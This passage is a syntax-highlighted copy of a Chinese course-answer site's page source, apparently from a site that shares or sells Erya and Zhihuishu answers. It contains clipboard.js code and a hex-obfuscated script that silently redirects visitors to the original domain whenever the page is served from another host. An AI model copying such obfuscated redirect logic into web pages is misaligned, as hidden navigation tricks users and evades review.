class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">              &#125;, &#123;</span></span><br><span class="line"><span class="javascript">                key: <span class="string">"destroy"</span>,</span></span><br><span class="line"><span class="javascript">                value: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">this</span>.listener.destroy(), <span class="keyword">this</span>.clipboardAction &amp;&amp; (<span class="keyword">this</span>.clipboardAction.destroy(), <span class="keyword">this</span>.clipboardAction = <span class="literal">null</span>)</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">              &#125;], [&#123;</span></span><br><span class="line"><span class="javascript">                key: <span class="string">"isSupported"</span>,</span></span><br><span class="line"><span class="javascript">                value: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">var</span> t = <span class="built_in">arguments</span>.length &gt; <span class="number">0</span> &amp;&amp; <span class="keyword">void</span> <span class="number">0</span> !== <span class="built_in">arguments</span>[<span class="number">0</span>] ? <span class="built_in">arguments</span>[<span class="number">0</span>] : [<span class="string">"copy"</span>, <span class="string">"cut"</span>],</span></span><br><span class="line"><span class="javascript">                    e = <span class="string">"string"</span> == <span class="keyword">typeof</span> t ? [t] : t,</span></span><br><span class="line"><span class="javascript">                    n = !!<span class="built_in">document</span>.queryCommandSupported;</span></span><br><span class="line"><span class="javascript">                  <span class="keyword">return</span> e.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                    n = n &amp;&amp; !!<span class="built_in">document</span>.queryCommandSupported(t)</span></span><br><span class="line"><span class="undefined">                  &#125;), n</span></span><br><span class="line"><span class="undefined">                &#125;</span></span><br><span class="line"><span class="undefined">              &#125;]), e</span></span><br><span class="line"><span class="undefined">            &#125;(s.default);</span></span><br><span class="line"><span class="undefined">          t.exports = p</span></span><br><span class="line"><span class="undefined">        &#125;)</span></span><br><span class="line"><span class="javascript">      &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">t, e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params">t, e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">for</span> (; t &amp;&amp; t.nodeType !== o;) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (<span class="string">"function"</span> == <span class="keyword">typeof</span> t.matches &amp;&amp; t.matches(e)) <span class="keyword">return</span> t;</span></span><br><span class="line"><span class="undefined">            t = t.parentNode</span></span><br><span class="line"><span class="undefined">          &#125;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> o = <span class="number">9</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (<span class="string">"undefined"</span> != <span class="keyword">typeof</span> Element &amp;&amp; !Element.prototype.matches) &#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">var</span> r = Element.prototype;</span></span><br><span class="line"><span class="undefined">          r.matches = r.matchesSelector || r.mozMatchesSelector || r.msMatchesSelector || r.oMatchesSelector || r.webkitMatchesSelector</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">        t.exports = n</span></span><br><span class="line"><span class="javascript">      &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">t, e, n</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">o</span>(<span class="params">t, e, n, o, r</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">var</span> a = i.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>);</span></span><br><span class="line"><span class="javascript">          <span class="keyword">return</span> t.addEventListener(n, a, r), &#123;</span></span><br><span class="line"><span class="javascript">            destroy: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="undefined">              t.removeEventListener(n, a, r)</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">          &#125;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params">t, e, n, r, i</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">return</span> <span class="string">"function"</span> == <span class="keyword">typeof</span> t.addEventListener ? o.apply(<span class="literal">null</span>, <span class="built_in">arguments</span>) : <span class="string">"function"</span> == <span class="keyword">typeof</span> n ? o.bind(<span class="literal">null</span>, <span class="built_in">document</span>).apply(<span class="literal">null</span>, <span class="built_in">arguments</span>) : (<span class="string">"string"</span> == <span class="keyword">typeof</span> t &amp;&amp; (t = <span class="built_in">document</span>.querySelectorAll(t)), <span class="built_in">Array</span>.prototype.map.call(</span></span><br><span class="line"><span class="undefined">            t,</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">              <span class="keyword">return</span> o(t, e, n, r, i)</span></span><br><span class="line"><span class="undefined">            &#125;))</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params">t, e, n, o</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">n</span>) </span>&#123;</span></span><br><span class="line"><span class="undefined">            n.delegateTarget = a(n.target, e), n.delegateTarget &amp;&amp; o.call(t, n)</span></span><br><span class="line"><span class="undefined">          &#125;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> a = n(<span class="number">4</span>);</span></span><br><span class="line"><span class="undefined">        t.exports = r</span></span><br><span class="line"><span class="javascript">      &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">t, e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        e.node = <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">return</span> <span class="keyword">void</span> <span class="number">0</span> !== t &amp;&amp; t <span class="keyword">instanceof</span> HTMLElement &amp;&amp; <span class="number">1</span> === t.nodeType</span></span><br><span class="line"><span class="javascript">        &#125;, e.nodeList = <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">var</span> n = <span class="built_in">Object</span>.prototype.toString.call(t);</span></span><br><span class="line"><span class="javascript">          <span class="keyword">return</span> <span class="keyword">void</span> <span class="number">0</span> !== t &amp;&amp; (<span class="string">"[object NodeList]"</span> === n || <span class="string">"[object HTMLCollection]"</span> === n) &amp;&amp; <span class="string">"length"</span> <span class="keyword">in</span> t &amp;&amp; (<span class="number">0</span> === t.length || e.node(t[<span class="number">0</span>]))</span></span><br><span class="line"><span class="javascript">        &#125;, e.string = <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">return</span> <span class="string">"string"</span> == <span class="keyword">typeof</span> t || t <span class="keyword">instanceof</span> <span class="built_in">String</span></span></span><br><span class="line"><span class="javascript">        &#125;, e.fn = <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">return</span> <span class="string">"[object Function]"</span> === <span class="built_in">Object</span>.prototype.toString.call(t)</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">      &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">t, e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params">t</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">var</span> e;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">if</span> (<span class="string">"SELECT"</span> === t.nodeName) t.focus(), e = t.value;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">"INPUT"</span> === t.nodeName || <span class="string">"TEXTAREA"</span> === t.nodeName) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> n = t.hasAttribute(<span class="string">"readonly"</span>);</span></span><br><span class="line"><span class="javascript">            n || t.setAttribute(<span class="string">"readonly"</span>, <span class="string">""</span>), t.select(), t.setSelectionRange(<span class="number">0</span>, t.value.length), n || t.removeAttribute(<span class="string">"readonly"</span>), e = t.value</span></span><br><span class="line"><span class="javascript">          &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">            t.hasAttribute(<span class="string">"contenteditable"</span>) &amp;&amp; t.focus();</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> o = <span class="built_in">window</span>.getSelection(),</span></span><br><span class="line"><span class="javascript">              r = <span class="built_in">document</span>.createRange();</span></span><br><span class="line"><span class="undefined">            r.selectNodeContents(t), o.removeAllRanges(), o.addRange(r), e = o.toString()</span></span><br><span class="line"><span class="undefined">          &#125;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">return</span> e</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">        t.exports = n</span></span><br><span class="line"><span class="undefined">      &#125;])</span></span><br><span class="line"><span class="undefined">    &#125;);</span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> clipboard = <span class="keyword">new</span> ClipboardJS(<span class="string">'.entry-content'</span>, &#123;</span></span><br><span class="line"><span class="javascript">      text: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//return '';</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined">    &#125;);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    clipboard.on(<span class="string">'success'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="comment">//console.log(e);</span></span></span><br><span class="line"><span class="undefined">    &#125;);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    clipboard.on(<span class="string">'error'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="comment">//console.log(e);</span></span></span><br><span class="line"><span class="undefined">    &#125;);</span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    str = <span class="string">"\x77\x77\x77\x2e\x67\x65\x62\x69\x64\x65\x6d\x65\x6e\x67\x6d\x69\x61\x6e\x72\x65\x6e\x2e\x63\x6f\x6d"</span>;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (<span class="built_in">window</span>[<span class="string">"\x64\x6f\x63\x75\x6d\x65\x6e\x74"</span>][<span class="string">"\x6c\x6f\x63\x61\x74\x69\x6f\x6e"</span>][<span class="string">"\x68\x6f\x73\x74"</span>] != str) &#123;</span></span><br><span class="line"><span class="javascript">      location[<span class="string">"\x68\x72\x65\x66"</span>] = location[<span class="string">"\x68\x72\x65\x66"</span>][<span class="string">"\x72\x65\x70\x6c\x61\x63\x65"</span>](<span class="built_in">window</span>[<span class="string">"\x64\x6f\x63\x75\x6d\x65\x6e\x74"</span>][<span class="string">"\x6c\x6f\x63\x61\x74\x69\x6f\x6e"</span>][<span class="string">"\x68\x6f\x73\x74"</span>], str);</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"header-top"</span> <span class="attr">class</span>=<span class="string">"header-bar-wrap"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"page"</span> <span class="attr">class</span>=<span class="string">"hfeed site"</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"skip-link screen-reader-text"</span> <span class="attr">href</span>=<span class="string">"#content"</span>&gt;</span>Skip to content<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">header</span> <span class="attr">id</span>=<span class="string">"masthead"</span> <span class="attr">class</span>=<span class="string">"site-header clearfix"</span> <span class="attr">role</span>=<span class="string">"banner"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"header-main container clearfix"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"logo"</span> <span class="attr">class</span>=<span class="string">"site-branding clearfix"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"site-title"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.gebidemengmianren.com/"</span> <span class="attr">rel</span>=<span class="string">"home"</span>&gt;</span>隔壁的萌面人<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"site-description"</span>&gt;</span>最专业的大学资料分享平台<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"header-widgets clearfix"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"main-navigation-wrap"</span> <span class="attr">class</span>=<span class="string">"primary-navigation-wrap"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">nav</span> <span class="attr">id</span>=<span class="string">"main-navigation"</span> <span class="attr">class</span>=<span class="string">"primary-navigation navigation container clearfix"</span> <span class="attr">role</span>=<span class="string">"navigation"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">"menu-menu-1"</span> <span class="attr">class</span>=<span class="string">"main-navigation-menu"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">"menu-item-2987"</span> <span class="attr">class</span>=<span class="string">"menu-item menu-item-type-post_type menu-item-object-page menu-item-2987"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.gebidemengmianren.com/question-and-answer"</span>&gt;</span>常见问题解答<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">"menu-item-2988"</span> <span class="attr">class</span>=<span class="string">"menu-item menu-item-type-taxonomy menu-item-object-category menu-item-2988"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.gebidemengmianren.com/category/zhihuishu"</span>&gt;</span>智慧树<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">"menu-item-2989"</span> <span class="attr">class</span>=<span class="string">"menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor current-menu-parent current-post-parent menu-item-2989"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.gebidemengmianren.com/category/eryadaanfufei"</span>&gt;</span>尔雅<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"content"</span> <span class="attr">class</span>=<span class="string">"site-content container clearfix"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">section</span> <span class="attr">id</span>=<span class="string">"primary"</span> <span class="attr">class</span>=<span class="string">"content-single content-area"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">main</span> <span class="attr">id</span>=<span class="string">"main"</span> <span class="attr">class</span>=<span class="string">"site-main"</span> <span class="attr">role</span>=<span class="string">"main"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">article</span> <span class="attr">id</span>=<span class="string">"post-198"</span> <span class="attr">class</span>=<span class="string">"post-198 post type-post status-publish format-standard post-password-protected hentry category-eryadaanfufei"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">header</span> <span class="attr">class</span>=<span class="string">"entry-header"</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"entry-meta"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"meta-date"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.gebidemengmianren.com/eryadaanfufei/198.html"</span> <span class="attr">title</span>=<span class="string">"下午10:02"</span> <span class="attr">rel</span>=<span class="string">"bookmark"</span>&gt;</span><span class="tag">&lt;<span class="name">time</span> <span class="attr">class</span>=<span class="string">"entry-date published updated"</span> <span class="attr">datetime</span>=<span class="string">"2019-03-20T22:02:27+00:00"</span>&gt;</span>2019年3月20日<span class="tag">&lt;/<span class="name">time</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">span</span></span></span><br><span class="line"><span class="tag">                  <span class="attr">class</span>=<span class="string">"meta-author"</span>&gt;</span> <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"author vcard"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"url fn n"</span> <span class="attr">href</span>=<span class="string">"http://www.gebidemengmianren.com/author/meng"</span> <span class="attr">title</span>=<span class="string">"View all posts by gebilaowang"</span> <span class="attr">rel</span>=<span class="string">"author"</span>&gt;</span>gebilaowang<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"entry-title"</span>&gt;</span>密码保护：当代中国政府与政治2019<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">footer</span> <span class="attr">class</span>=<span class="string">"entry-footer"</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"entry-categories clearfix"</span>&gt;</span> <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"meta-categories"</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.gebidemengmianren.com/category/eryadaanfufei"</span> <span class="attr">rel</span>=<span class="string">"category tag"</span>&gt;</span>尔雅<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">"navigation post-navigation"</span> <span class="attr">role</span>=<span class="string">"navigation"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">"screen-reader-text"</span>&gt;</span>文章导航<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"nav-links"</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"nav-previous"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.gebidemengmianren.com/eryadaanfufei/196.html"</span> <span class="attr">rel</span>=<span class="string">"prev"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"screen-reader-text"</span>&gt;</span>Previous Post:<span class="tag">&lt;/<span class="name">span</span>&gt;</span>当代中国经济2019修正版<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"nav-next"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.gebidemengmianren.com/eryadaanfufei/200.html"</span> <span class="attr">rel</span>=<span class="string">"next"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"screen-reader-text"</span>&gt;</span>Next Post:<span class="tag">&lt;/<span class="name">span</span>&gt;</span>当政府遇上互联网2019<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">article</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"comments"</span> <span class="attr">class</span>=<span class="string">"comments-area"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">main</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">section</span> <span class="attr">id</span>=<span class="string">"secondary"</span> <span class="attr">class</span>=<span class="string">"sidebar widget-area clearfix sidebar-my-flag"</span> <span class="attr">role</span>=<span class="string">"complementary"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aside</span> <span class="attr">id</span>=<span class="string">"search-6"</span> <span class="attr">class</span>=<span class="string">"widget widget_search clearfix"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">form</span> <span class="attr">role</span>=<span class="string">"search"</span> <span class="attr">method</span>=<span class="string">"get"</span> <span class="attr">class</span>=<span class="string">"search-form"</span> <span class="attr">action</span>=<span class="string">"http://www.gebidemengmianren.com/"</span>&gt;</span> <span class="tag">&lt;<span class="name">label</span>&gt;</span> <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"screen-reader-text"</span>&gt;</span>Search for:<span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"search"</span> <span class="attr">class</span>=<span class="string">"search-field"</span> <span class="attr">placeholder</span>=<span class="string">"搜索 &amp;hellip;"</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">name</span>=<span class="string">"s"</span></span></span><br><span class="line"><span class="tag">                <span class="attr">title</span>=<span class="string">"Search for:"</span> /&gt;</span> <span class="tag">&lt;/<span class="name">label</span>&gt;</span> <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"search-submit"</span>&gt;</span> <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"genericon-search"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"screen-reader-text"</span>&gt;</span>Search<span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">aside</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.gebidemengmianren.com/question-and-answer"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"livechat-girl animated"</span>&gt;</span> <span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">"girl"</span> <span class="attr">src</span>=<span class="string">"http://www.gebidemengmianren.com/kefu/images/en_3.png"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"livechat-hint rd-notice-tooltip rd-notice-type-success rd-notice-position-left single-line show_hint"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"rd-notice-content"</span>&gt;</span> 我来帮您！<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"animated-circles"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"circle c-1"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"circle c-2"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"circle c-3"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"http://www.xuexianswer.com/kefu/css/css.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">media</span>=<span class="string">"screen"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"http://www.xuexianswer.com/kefu/js/jquery-1.7.1.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"http://www.xuexianswer.com/kefu/js/kefu.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"http://www.gebidemengmianren.com/kefu/js/en_3.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"footer"</span> <span class="attr">class</span>=<span class="string">"footer-wrap"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">footer</span> <span class="attr">id</span>=<span class="string">"colophon"</span> <span class="attr">class</span>=<span class="string">"site-footer container clearfix"</span> <span class="attr">role</span>=<span class="string">"contentinfo"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.gebidemengmianren.com/"</span> <span class="attr">style</span>=<span class="string">'text-decoration:none; color:#939393;'</span>&gt;</span>&amp;copy;隔壁的萌面人<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;/<span class="name">br</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span 